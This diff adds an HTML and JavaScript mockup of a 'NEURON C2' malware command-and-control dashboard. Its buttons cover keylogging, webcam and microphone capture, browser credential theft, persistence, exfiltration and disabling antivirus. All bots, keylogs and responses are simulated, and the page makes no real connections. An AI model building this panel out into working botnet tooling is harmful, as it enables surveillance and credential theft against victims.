@@ -1,0 +1,951 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEURON C2 - Cyberpunk Command & Control</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Orbitron', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        /* Matrix rain background */
+        #matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.1;
+        }
+        
+        /* Scan lines effect */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                repeating-linear-gradient(
+                    0deg,
+                    transparent,
+                    transparent 2px,
+                    rgba(0, 255, 0, 0.03) 2px,
+                    rgba(0, 255, 0, 0.03) 4px
+                );
+            pointer-events: none;
+            animation: scan 8s linear infinite;
+        }
+        
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(20px); }
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+            padding: 30px;
+            border-bottom: 2px solid #00ff00;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 72px;
+            font-weight: 900;
+            text-shadow: 
+                0 0 10px #00ff00,
+                0 0 20px #00ff00,
+                0 0 40px #00ff00,
+                0 0 80px #00ff00;
+            display: inline-block;
+            animation: glitch 3s infinite;
+            letter-spacing: 0.1em;
+        }
+        
+        @keyframes glitch {
+            0%, 100% { 
+                text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 40px #00ff00;
+                transform: translate(0);
+            }
+            20% { 
+                text-shadow: -3px 0 #ff0000, 3px 0 #00ffff;
+                transform: translate(2px, -2px);
+            }
+            40% { 
+                text-shadow: 3px 0 #ff00ff, -3px 0 #ffff00;
+                transform: translate(-2px, 2px);
+            }
+            60% { 
+                text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
+                transform: translate(0);
+            }
+        }
+        
+        .nav-buttons {
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .nav-btn {
+            background: transparent;
+            border: 2px solid #00ff00;
+            color: #00ff00;
+            padding: 15px 30px;
+            margin: 0 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Orbitron', monospace;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+        }
+        
+        .nav-btn:hover {
+            background: rgba(0, 255, 0, 0.2);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.6);
+            transform: translateY(-2px);
+        }
+        
+        .nav-btn.active {
+            background: rgba(0, 255, 0, 0.3);
+            border-color: #00ffff;
+            color: #00ffff;
+        }
+        
+        /* View containers */
+        .view-container {
+            display: none;
+            padding: 20px;
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+        
+        .view-container.active {
+            display: block;
+        }
+        
+        /* Dashboard view */
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+        
+        .stat-card {
+            background: linear-gradient(135deg, rgba(0, 255, 0, 0.1) 0%, rgba(0, 255, 255, 0.05) 100%);
+            border: 2px solid #00ff00;
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        
+        .stat-card:hover {
+            background: rgba(0, 255, 0, 0.2);
+            box-shadow: 0 0 50px rgba(0, 255, 0, 0.8);
+            transform: translateY(-5px) scale(1.02);
+            border-color: #00ffff;
+        }
+        
+        .stat-value {
+            font-size: 64px;
+            font-weight: 700;
+            color: #00ffff;
+            text-shadow: 0 0 30px rgba(0, 255, 255, 0.8);
+            line-height: 1;
+        }
+        
+        .bot-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+            gap: 25px;
+        }
+        
+        .bot-card {
+            background: rgba(0, 20, 40, 0.6);
+            border: 2px solid #00ff00;
+            padding: 20px;
+            position: relative;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .bot-card:hover {
+            transform: scale(1.03);
+            box-shadow: 0 0 40px rgba(0, 255, 0, 0.6);
+            border-color: #00ffff;
+        }
+        
+        /* Client detail view */
+        .client-header {
+            background: linear-gradient(135deg, rgba(0, 255, 0, 0.1) 0%, rgba(0, 255, 255, 0.05) 100%);
+            border: 2px solid #00ff00;
+            padding: 30px;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .client-header h2 {
+            font-size: 36px;
+            color: #00ffff;
+            text-shadow: 0 0 20px rgba(0, 255, 255, 0.8);
+            margin-bottom: 20px;
+        }
+        
+        .client-info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+        
+        .info-item {
+            padding: 10px;
+            border-left: 3px solid #00ff00;
+            padding-left: 20px;
+        }
+        
+        .info-label {
+            color: #888;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+        }
+        
+        .info-value {
+            color: #00ffff;
+            font-size: 18px;
+            margin-top: 5px;
+        }
+        
+        .tabs {
+            display: flex;
+            border-bottom: 2px solid #00ff00;
+            margin-bottom: 30px;
+        }
+        
+        .tab {
+            background: transparent;
+            border: none;
+            color: #00ff00;
+            padding: 15px 30px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Orbitron', monospace;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            border-bottom: 3px solid transparent;
+        }
+        
+        .tab:hover {
+            background: rgba(0, 255, 0, 0.1);
+        }
+        
+        .tab.active {
+            border-bottom-color: #00ffff;
+            color: #00ffff;
+            background: rgba(0, 255, 0, 0.2);
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        /* Data displays */
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+        }
+        
+        .data-item {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #00ff00;
+            padding: 15px;
+            transition: all 0.3s;
+        }
+        
+        .data-item:hover {
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+            transform: scale(1.02);
+        }
+        
+        .screenshot-thumb {
+            width: 100%;
+            height: 200px;
+            background: #111;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #666;
+            margin-bottom: 10px;
+            overflow: hidden;
+        }
+        
+        .screenshot-thumb img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .keylog-preview {
+            background: #000;
+            border: 1px solid #333;
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            height: 200px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+        
+        .command-history {
+            background: #000;
+            border: 1px solid #00ff00;
+            padding: 20px;
+            max-height: 600px;
+            overflow-y: auto;
+        }
+        
+        .cmd-entry {
+            margin-bottom: 15px;
+            padding: 10px;
+            border-left: 3px solid #00ff00;
+            background: rgba(0, 255, 0, 0.05);
+        }
+        
+        .cmd-time {
+            color: #666;
+            font-size: 12px;
+        }
+        
+        .cmd-name {
+            color: #00ffff;
+            font-weight: bold;
+            margin: 5px 0;
+        }
+        
+        .cmd-response {
+            color: #888;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            margin-top: 10px;
+            padding: 10px;
+            background: #000;
+            border: 1px solid #333;
+        }
+        
+        /* Terminal */
+        .terminal {
+            background: #000;
+            border: 2px solid #00ff00;
+            padding: 20px;
+            margin: 20px 0;
+            height: 400px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+        }
+        
+        .terminal-line {
+            color: #00ff00;
+            margin: 4px 0;
+        }
+        
+        .terminal-line.error {
+            color: #ff0000;
+        }
+        
+        .terminal-line.info {
+            color: #00ffff;
+        }
+        
+        .terminal-line.warning {
+            color: #ffff00;
+        }
+        
+        /* Command buttons */
+        .command-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .cmd-btn {
+            background: transparent;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Orbitron', monospace;
+            font-size: 12px;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .cmd-btn:hover {
+            background: rgba(0, 255, 0, 0.2);
+            text-shadow: 0 0 10px #00ff00;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.6);
+        }
+        
+        /* Back button */
+        .back-btn {
+            position: fixed;
+            top: 100px;
+            left: 20px;
+            background: transparent;
+            border: 2px solid #ff0000;
+            color: #ff0000;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-family: 'Orbitron', monospace;
+            transition: all 0.3s;
+            z-index: 100;
+        }
+        
+        .back-btn:hover {
+            background: rgba(255, 0, 0, 0.2);
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrix-bg"></canvas>
+    
+    <div class="header">
+        <div class="logo">NEURON C2</div>
+        <div style="color: #00ffff; margin-top: 10px;">Cyberpunk Command & Control System</div>
+    </div>
+    
+    <div class="nav-buttons">
+        <button class="nav-btn active" onclick="showView('dashboard')">DASHBOARD</button>
+        <button class="nav-btn" onclick="showView('clients')">ALL CLIENTS</button>
+        <button class="nav-btn" onclick="showView('logs')">SYSTEM LOGS</button>
+        <button class="nav-btn" onclick="showView('settings')">SETTINGS</button>
+    </div>
+    
+    <!-- Dashboard View -->
+    <div id="dashboard-view" class="view-container active">
+        <div class="stats-container">
+            <div class="stat-card">
+                <div class="stat-label">Active Bots</div>
+                <div class="stat-value" id="activeBots">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Total Connected</div>
+                <div class="stat-value" id="totalBots">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Data Exfiltrated</div>
+                <div class="stat-value" id="dataExfil">0<span style="font-size: 24px;">MB</span></div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Commands Executed</div>
+                <div class="stat-value" id="cmdCount">0</div>
+            </div>
+        </div>
+        
+        <h2 style="text-align: center; margin: 40px 0; color: #00ffff; text-transform: uppercase;">Active Bots</h2>
+        <div class="bot-grid" id="botGrid"></div>
+        
+        <div class="terminal" id="mainTerminal">
+            <div class="terminal-line info">[SYSTEM] NEURON C2 Dashboard Initialized</div>
+        </div>
+    </div>
+    
+    <!-- Client Detail View -->
+    <div id="client-detail-view" class="view-container">
+        <button class="back-btn" onclick="showView('dashboard')">← BACK</button>
+        
+        <div class="client-header">
+            <h2 id="clientName">CLIENT DETAILS</h2>
+            <div class="client-info-grid">
+                <div class="info-item">
+                    <div class="info-label">IP Address</div>
+                    <div class="info-value" id="clientIP">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Hostname</div>
+                    <div class="info-value" id="clientHostname">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Username</div>
+                    <div class="info-value" id="clientUsername">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">OS Version</div>
+                    <div class="info-value" id="clientOS">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Status</div>
+                    <div class="info-value" id="clientStatus">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Last Seen</div>
+                    <div class="info-value" id="clientLastSeen">-</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="command-buttons">
+            <button class="cmd-btn" onclick="sendClientCommand('screenshot')">SCREENSHOT</button>
+            <button class="cmd-btn" onclick="sendClientCommand('keylog')">KEYLOGGER</button>
+            <button class="cmd-btn" onclick="sendClientCommand('sysinfo')">SYSTEM INFO</button>
+            <button class="cmd-btn" onclick="sendClientCommand('processes')">PROCESSES</button>
+            <button class="cmd-btn" onclick="sendClientCommand('persistence')">PERSISTENCE</button>
+            <button class="cmd-btn" onclick="sendClientCommand('exfiltrate')">EXFILTRATE</button>
+            <button class="cmd-btn" onclick="sendClientCommand('webcam')">WEBCAM</button>
+            <button class="cmd-btn" onclick="sendClientCommand('microphone')">MICROPHONE</button>
+            <button class="cmd-btn" onclick="sendClientCommand('browsers')">BROWSER CREDS</button>
+            <button class="cmd-btn" onclick="sendClientCommand('defense')">DISABLE AV</button>
+            <button class="cmd-btn" onclick="sendClientCommand('shell')">SHELL</button>
+            <button class="cmd-btn" onclick="sendClientCommand('terminate')">TERMINATE</button>
+        </div>
+        
+        <div class="tabs">
+            <button class="tab active" onclick="showTab('screenshots')">SCREENSHOTS</button>
+            <button class="tab" onclick="showTab('keylogs')">KEYLOGS</button>
+            <button class="tab" onclick="showTab('files')">FILES</button>
+            <button class="tab" onclick="showTab('commands')">COMMAND HISTORY</button>
+            <button class="tab" onclick="showTab('system')">SYSTEM INFO</button>
+            <button class="tab" onclick="showTab('terminal')">TERMINAL</button>
+        </div>
+        
+        <div id="screenshots-tab" class="tab-content active">
+            <h3 style="margin-bottom: 20px; color: #00ffff;">Captured Screenshots</h3>
+            <div class="data-grid" id="screenshotGrid">
+                <!-- Screenshots will be populated here -->
+            </div>
+        </div>
+        
+        <div id="keylogs-tab" class="tab-content">
+            <h3 style="margin-bottom: 20px; color: #00ffff;">Keylogger Data</h3>
+            <div id="keylogData">
+                <!-- Keylog data will be populated here -->
+            </div>
+        </div>
+        
+        <div id="files-tab" class="tab-content">
+            <h3 style="margin-bottom: 20px; color: #00ffff;">Exfiltrated Files</h3>
+            <div class="data-grid" id="filesGrid">
+                <!-- Files will be populated here -->
+            </div>
+        </div>
+        
+        <div id="commands-tab" class="tab-content">
+            <h3 style="margin-bottom: 20px; color: #00ffff;">Command Execution History</h3>
+            <div class="command-history" id="commandHistory">
+                <!-- Command history will be populated here -->
+            </div>
+        </div>
+        
+        <div id="system-tab" class="tab-content">
+            <h3 style="margin-bottom: 20px; color: #00ffff;">System Information</h3>
+            <div id="systemInfo">
+                <!-- System info will be populated here -->
+            </div>
+        </div>
+        
+        <div id="terminal-tab" class="tab-content">
+            <h3 style="margin-bottom: 20px; color: #00ffff;">Client Terminal</h3>
+            <div class="terminal" id="clientTerminal">
+                <!-- Client-specific terminal output -->
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Global variables
+        let currentView = 'dashboard';
+        let currentClient = null;
+        let currentTab = 'screenshots';
+        let clientData = {};
+        
+        // Matrix rain effect
+        const canvas = document.getElementById('matrix-bg');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}";
+        const matrixArray = matrix.split("");
+        
+        const fontSize = 10;
+        const columns = canvas.width / fontSize;
+        
+        const drops = [];
+        for(let x = 0; x < columns; x++) {
+            drops[x] = Math.floor(Math.random() * canvas.height / fontSize);
+        }
+        
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = '#00ff00';
+            ctx.font = fontSize + 'px monospace';
+            
+            for(let i = 0; i < drops.length; i++) {
+                const text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        
+        setInterval(drawMatrix, 35);
+        
+        // View management
+        function showView(view) {
+            document.querySelectorAll('.view-container').forEach(v => v.classList.remove('active'));
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+            
+            if (view === 'client-detail') {
+                document.getElementById('client-detail-view').classList.add('active');
+            } else {
+                document.getElementById(`${view}-view`).classList.add('active');
+                document.querySelector(`[onclick="showView('${view}')"]`).classList.add('active');
+            }
+            
+            currentView = view;
+        }
+        
+        // Tab management
+        function showTab(tab) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            
+            document.querySelector(`[onclick="showTab('${tab}')"]`).classList.add('active');
+            document.getElementById(`${tab}-tab`).classList.add('active');
+            
+            currentTab = tab;
+            
+            // Load tab-specific data
+            if (currentClient) {
+                loadClientTabData(currentClient, tab);
+            }
+        }
+        
+        // Client detail view
+        function showClientDetail(clientId) {
+            currentClient = clientId;
+            showView('client-detail');
+            
+            // Load client data
+            const client = clientData[clientId];
+            if (client) {
+                document.getElementById('clientName').textContent = client.hostname;
+                document.getElementById('clientIP').textContent = client.ip;
+                document.getElementById('clientHostname').textContent = client.hostname;
+                document.getElementById('clientUsername').textContent = client.username + (client.isAdmin ? ' [ADMIN]' : '');
+                document.getElementById('clientOS').textContent = client.os;
+                document.getElementById('clientStatus').textContent = client.active ? 'ONLINE' : 'OFFLINE';
+                document.getElementById('clientStatus').style.color = client.active ? '#00ff00' : '#ff0000';
+                document.getElementById('clientLastSeen').textContent = new Date(client.lastSeen).toLocaleString();
+                
+                // Load initial tab data
+                loadClientTabData(clientId, currentTab);
+            }
+        }
+        
+        // Load client-specific tab data
+        function loadClientTabData(clientId, tab) {
+            const client = clientData[clientId];
+            
+            switch(tab) {
+                case 'screenshots':
+                    loadScreenshots(clientId);
+                    break;
+                case 'keylogs':
+                    loadKeylogs(clientId);
+                    break;
+                case 'files':
+                    loadFiles(clientId);
+                    break;
+                case 'commands':
+                    loadCommandHistory(clientId);
+                    break;
+                case 'system':
+                    loadSystemInfo(clientId);
+                    break;
+                case 'terminal':
+                    loadTerminal(clientId);
+                    break;
+            }
+        }
+        
+        // Load screenshots
+        function loadScreenshots(clientId) {
+            const grid = document.getElementById('screenshotGrid');
+            grid.innerHTML = '';
+            
+            // Simulate screenshot data (in real implementation, fetch from server)
+            const screenshots = [
+                { id: 1, timestamp: Date.now() - 3600000, filename: 'screenshot_001.png' },
+                { id: 2, timestamp: Date.now() - 7200000, filename: 'screenshot_002.png' },
+                { id: 3, timestamp: Date.now() - 10800000, filename: 'screenshot_003.png' },
+            ];
+            
+            screenshots.forEach(ss => {
+                const item = document.createElement('div');
+                item.className = 'data-item';
+                item.innerHTML = `
+                    <div class="screenshot-thumb">
+                        <div>[Screenshot ${ss.id}]</div>
+                    </div>
+                    <div style="font-size: 12px;">
+                        <div>File: ${ss.filename}</div>
+                        <div>Time: ${new Date(ss.timestamp).toLocaleString()}</div>
+                    </div>
+                `;
+                grid.appendChild(item);
+            });
+        }
+        
+        // Load keylogs
+        function loadKeylogs(clientId) {
+            const container = document.getElementById('keylogData');
+            container.innerHTML = '';
+            
+            // Simulate keylog data
+            const keylogs = [
+                {
+                    timestamp: Date.now() - 1800000,
+                    window: 'Chrome - Gmail',
+                    data: 'user@example.com[TAB]MyPassword123[ENTER]'
+                },
+                {
+                    timestamp: Date.now() - 3600000,
+                    window: 'Notepad',
+                    data: 'Meeting notes:\n- Discuss project timeline\n- Review budget'
+                }
+            ];
+            
+            keylogs.forEach(log => {
+                const item = document.createElement('div');
+                item.className = 'data-item';
+                item.innerHTML = `
+                    <div style="color: #00ffff; margin-bottom: 10px;">
+                        [${new Date(log.timestamp).toLocaleString()}] Window: ${log.window}
+                    </div>
+                    <div class="keylog-preview">${log.data}</div>
+                `;
+                container.appendChild(item);
+            });
+        }
+        
+        // Load command history
+        function loadCommandHistory(clientId) {
+            const container = document.getElementById('commandHistory');
+            container.innerHTML = '';
+            
+            // Simulate command history
+            const commands = [
+                {
+                    time: Date.now() - 600000,
+                    command: 'SCREENSHOT',
+                    response: 'Screenshot captured successfully'
+                },
+                {
+                    time: Date.now() - 1200000,
+                    command: 'SYSTEM_INFO',
+                    response: 'System information collected'
+                },
+                {
+                    time: Date.now() - 1800000,
+                    command: 'KEYLOGGER_START',
+                    response: 'Keylogger activated'
+                }
+            ];
+            
+            commands.forEach(cmd => {
+                const entry = document.createElement('div');
+                entry.className = 'cmd-entry';
+                entry.innerHTML = `
+                    <div class="cmd-time">${new Date(cmd.time).toLocaleString()}</div>
+                    <div class="cmd-name">${cmd.command}</div>
+                    <div class="cmd-response">${cmd.response}</div>
+                `;
+                container.appendChild(entry);
+            });
+        }
+        
+        // Send command to specific client
+        function sendClientCommand(command) {
+            addTerminalLine(`[COMMAND] Sending ${command.toUpperCase()} to ${currentClient}`, 'warning', 'clientTerminal');
+            
+            // Simulate response
+            setTimeout(() => {
+                addTerminalLine(`[RESPONSE] ${currentClient} executed ${command}`, 'info', 'clientTerminal');
+            }, 1000);
+        }
+        
+        // Terminal output
+        function addTerminalLine(text, type = '', terminalId = 'mainTerminal') {
+            const terminal = document.getElementById(terminalId);
+            const line = document.createElement('div');
+            line.className = 'terminal-line ' + type;
+            const time = new Date().toLocaleTimeString();
+            line.textContent = `[${time}] ${text}`;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        // Update dashboard
+        function updateDashboard() {
+            // Simulated data
+            const stats = {
+                activeBots: 3,
+                totalBots: 5,
+                dataExfiltrated: 156.7,
+                commandsExecuted: 247
+            };
+            
+            const bots = [
+                {
+                    id: "192.168.1.105:4455",
+                    hostname: "DESKTOP-A3K9L2M",
+                    username: "john.doe",
+                    isAdmin: true,
+                    os: "Windows 10 Pro",
+                    active: true,
+                    lastSeen: new Date(),
+                    ip: "192.168.1.105"
+                },
+                {
+                    id: "192.168.1.112:4462",
+                    hostname: "LAPTOP-X9Y2Z3B",
+                    username: "sarah.smith",
+                    isAdmin: false,
+                    os: "Windows 11",
+                    active: true,
+                    lastSeen: new Date(),
+                    ip: "192.168.1.112"
+                },
+                {
+                    id: "192.168.1.120:4470",
+                    hostname: "WORKSTATION-01",
+                    username: "admin",
+                    isAdmin: true,
+                    os: "Windows Server 2019",
+                    active: false,
+                    lastSeen: new Date(Date.now() - 600000),
+                    ip: "192.168.1.120"
+                }
+            ];
+            
+            // Store client data globally
+            bots.forEach(bot => {
+                clientData[bot.id] = bot;
+            });
+            
+            // Update stats
+            document.getElementById('activeBots').textContent = stats.activeBots;
+            document.getElementById('totalBots').textContent = stats.totalBots;
+            document.getElementById('dataExfil').innerHTML = stats.dataExfiltrated.toFixed(1) + '<span style="font-size: 24px;">MB</span>';
+            document.getElementById('cmdCount').textContent = stats.commandsExecuted;
+            
+            // Update bot grid
+            const botGrid = document.getElementById('botGrid');
+            botGrid.innerHTML = '';
+            
+            bots.forEach(bot => {
+                const botCard = document.createElement('div');
+                botCard.className = 'bot-card' + (bot.active ? '' : ' offline');
+                botCard.onclick = () => showClientDetail(bot.id);
+                
+                botCard.innerHTML = `
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
+                        <h3 style="color: #00ffff;">${bot.hostname}</h3>
+                        <div style="width: 12px; height: 12px; border-radius: 50%; background: ${bot.active ? '#00ff00' : '#ff0000'}; box-shadow: 0 0 10px ${bot.active ? '#00ff00' : '#ff0000'};"></div>
+                    </div>
+                    <div style="font-size: 14px; line-height: 1.8;">
+                        <div>IP: <span style="color: #00ffff;">${bot.ip}</span></div>
+                        <div>User: <span style="color: #00ffff;">${bot.username}</span> ${bot.isAdmin ? '<span style="color: #ff0000">[ADMIN]</span>' : ''}</div>
+                        <div>OS: <span style="color: #00ffff;">${bot.os}</span></div>
+                        <div>Last Seen: <span style="color: #00ffff;">${bot.lastSeen.toLocaleTimeString()}</span></div>
+                    </div>
+                    <div style="margin-top: 15px; text-align: center;">
+                        <button class="cmd-btn" style="width: 100%;" onclick="event.stopPropagation(); showClientDetail('${bot.id}')">VIEW DETAILS →</button>
+                    </div>
+                `;
+                
+                botGrid.appendChild(botCard);
+            });
+            
+            addTerminalLine('[UPDATE] Dashboard refreshed', 'info');
+        }
+        
+        // Initialize
+        updateDashboard();
+        setInterval(updateDashboard, 5000);
+        
+        // Placeholder functions for other tabs
+        function loadFiles(clientId) {
+            const grid = document.getElementById('filesGrid');
+            grid.innerHTML = '<div class="data-item">No exfiltrated files yet</div>';
+        }
+        
+        function loadSystemInfo(clientId) {
+            const container = document.getElementById('systemInfo');
+            container.innerHTML = `
+                <div class="data-item">
+                    <pre style="color: #00ff00; font-family: 'Courier New', monospace;">
+System Information
+==================
+Hostname: ${clientData[clientId].hostname}
+Username: ${clientData[clientId].username}
+OS: ${clientData[clientId].os}
+Architecture: x64
+CPU: Intel Core i7-9700K @ 3.60GHz
+RAM: 16GB
+Network Adapters: 2
+                    </pre>
+                </div>
+            `;
+        }
+        
+        function loadTerminal(clientId) {
+            addTerminalLine(`Connected to ${clientId}`, 'info', 'clientTerminal');
+        }
+        
+        // Window resize handler
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+    </script>
+</body>
+</html>
